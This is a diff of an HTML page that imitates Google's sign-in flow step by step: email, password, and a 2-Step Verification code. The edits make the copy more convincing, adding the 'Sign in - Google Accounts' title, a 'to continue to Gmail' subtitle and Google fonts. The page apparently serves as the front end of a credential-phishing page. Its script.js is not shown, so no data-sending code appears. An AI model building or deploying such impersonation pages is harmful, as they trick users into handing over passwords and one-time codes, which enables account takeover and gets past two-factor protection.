@@ -3,135 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Account</title>
+    <title>Sign in - Google Accounts</title>
     <link rel="stylesheet" href="styles.css">
     <link rel="shortcut icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
 </head>
 <body>
-    <header>
-            <div class="logo-wrapper">
-                <div class="google-logo">
-                    <span class="blue">G</span>
-                    <span class="red">o</span>
-                    <span class="yellow">o</span>
-                    <span class="blue">g</span>
-                    <span class="green">l</span>
-                    <span class="red">e</span>
-                </div>
-            </div>
-    </header>
+    <div class="container">
+        <header>
+            <div class="google-logo">Google</div>
+        </header>
 
-    <main>
-        <!-- Email Entry Card -->
-        <div class="card" id="email-card">
-            <div class="card-header">
-                <h1>Sign in</h1>
-                <p>Use your Google Account</p>
-            </div>
-            <div class="card-body">
-                <form id="email-form">
-                    <div class="form-group">
-                        <input type="email" id="email" name="email" required autofocus>
-                        <label for="email">Email or phone</label>
-                        <div class="error-message" id="email-error"></div>
-                    </div>
-                    <div class="forgot-email">
-                        <a href="#">Forgot email?</a>
-                    </div>
-                    <div class="card-footer">
-                        <div class="footer-links">
-                            <a href="#">Create account</a>
+        <main>
+            <!-- Email Card -->
+            <div class="card" id="email-card">
+                <div class="card-content">
+                    <h1>Sign in</h1>
+                    <p class="subtitle">to continue to Gmail</p>
+                    
+                    <form id="email-form">
+                        <div class="form-group">
+                            <input type="email" id="email" name="email" required autofocus>
+                            <label for="email">Email or phone</label>
+                            <div class="error-message" id="email-error"></div>
                         </div>
-                        <button type="submit" class="btn primary">Next</button>
-                    </div>
-                </form>
-            </div>
-        </div>
-
-        <!-- Password Entry Card -->
-        <div class="card hidden" id="password-card">
-            <div class="card-header">
-                <div class="back-btn" id="back-to-email">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
-                    </svg>
+                        
+                        <div class="forgot-email">
+                            <a href="#">Forgot email?</a>
+                        </div>
+                        
+                        <div class="privacy-notice">
+                            <p>Not your computer? Use Guest mode to sign in privately.</p>
+                            <a href="#">Learn more</a>
+                        </div>
+                        
+                        <div class="card-footer">
+                            <a href="#" class="create-account">Create account</a>
+                            <button type="submit" class="btn primary">Next</button>
+                        </div>
+                    </form>
                 </div>
-                <h1>Welcome</h1>
-                <p id="display-email">user@example.com</p>
             </div>
-            <div class="card-body">
-                <form id="password-form">
-                    <div class="form-group">
-                        <input type="password" id="password" name="password" required>
-                        <label for="password">Enter your password</label>
-                        <div class="error-message" id="password-error"></div>
-                    </div>
-                    <div class="forgot-password">
-                        <a href="#">Forgot password?</a>
-                    </div>
-                    <div class="card-footer">
-                        <button type="submit" class="btn primary">Next</button>
-                    </div>
-                </form>
-            </div>
-        </div>
 
-        <!-- 2-Step Verification Card -->
-        <div class="card hidden" id="verification-card">
-            <div class="card-header">
-                <div class="back-btn" id="back-to-password">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
-                    </svg>
+            <!-- Password Card (hidden initially) -->
+            <div class="card hidden" id="password-card">
+                <div class="card-content">
+                    <div class="back-btn" id="back-to-email">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+                        </svg>
+                    </div>
+                    
+                    <h1>Welcome</h1>
+                    <p class="user-email" id="display-email">user@example.com</p>
+                    
+                    <form id="password-form">
+                        <div class="form-group">
+                            <input type="password" id="password" name="password" required>
+                            <label for="password">Enter your password</label>
+                            <div class="error-message" id="password-error"></div>
+                        </div>
+                        
+                        <div class="forgot-password">
+                            <a href="#">Forgot password?</a>
+                        </div>
+                        
+                        <div class="card-footer">
+                            <button type="submit" class="btn primary">Next</button>
+                        </div>
+                    </form>
                 </div>
-                <h1>2-Step Verification</h1>
-                <p id="verification-email">user@example.com</p>
             </div>
-            <div class="card-body">
-                <div class="verification-icon">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 12h-2v-2h2v2zm0-4h-2V6h2v4z"/>
-                    </svg>
-                </div>
-                <h2>Get a verification code</h2>
-                <p class="verification-text">Google will send a 6-digit code to your phone ending in 1234.</p>
-                <p class="verification-text">Enter it below to verify it's you.</p>
-                
-                <form id="verification-form">
-                    <div class="form-group">
-                        <input type="text" id="verification-code" name="verification-code" required maxlength="6">
-                        <label for="verification-code">Enter code</label>
-                        <div class="error-message" id="verification-error"></div>
-                    </div>
-                    <div class="verification-options">
-                        <a href="#" class="verification-link">Text me</a>
-                        <a href="#" class="verification-link">Call me</a>
-                    </div>
-                    <div class="card-footer">
-                        <button type="submit" class="btn primary">Verify</button>
-                    </div>
-                </form>
-            </div>
-        </div>
-    </main>
 
-    <footer>
-        <div class="footer-content">
+            <!-- Verification Card (hidden initially) -->
+            <div class="card hidden" id="verification-card">
+                <div class="card-content">
+                    <div class="back-btn" id="back-to-password">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+                        </svg>
+                    </div>
+                    
+                    <h1>2-Step Verification</h1>
+                    <p class="user-email" id="verification-email">user@example.com</p>
+                    
+                    <div class="verification-content">
+                        <div class="verification-icon">
+                            <svg viewBox="0 0 24 24">
+                                <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 12h-2v-2h2v2zm0-4h-2V6h2v4z"/>
+                            </svg>
+                        </div>
+                        
+                        <h2>Get a verification code</h2>
+                        <p class="verification-text">Google will send a 6-digit code to your phone ending in 1234.</p>
+                        <p class="verification-text">Enter it below to verify it's you.</p>
+                        
+                        <form id="verification-form">
+                            <div class="form-group">
+                                <input type="text" id="verification-code" name="verification-code" required maxlength="6">
+                                <label for="verification-code">Enter code</label>
+                                <div class="error-message" id="verification-error"></div>
+                            </div>
+                            
+                            <div class="verification-options">
+                                <a href="#" class="verification-link">Text me</a>
+                                <a href="#" class="verification-link">Call me</a>
+                            </div>
+                            
+                            <div class="card-footer">
+                                <button type="submit" class="btn primary">Verify</button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <footer>
             <div class="language-selector">
                 <select>
                     <option>English (United States)</option>
-                    <option>Español</option>
-                    <option>Français</option>
+                    <option>Español (Latinoamérica)</option>
+                    <option>Português (Brasil)</option>
                 </select>
             </div>
+            
             <div class="footer-links">
                 <a href="#">Help</a>
                 <a href="#">Privacy</a>
                 <a href="#">Terms</a>
             </div>
-        </div>
-    </footer>
+        </footer>
+    </div>
 
     <script src="script.js"></script>
 </body>
-    </html>
+        </html>
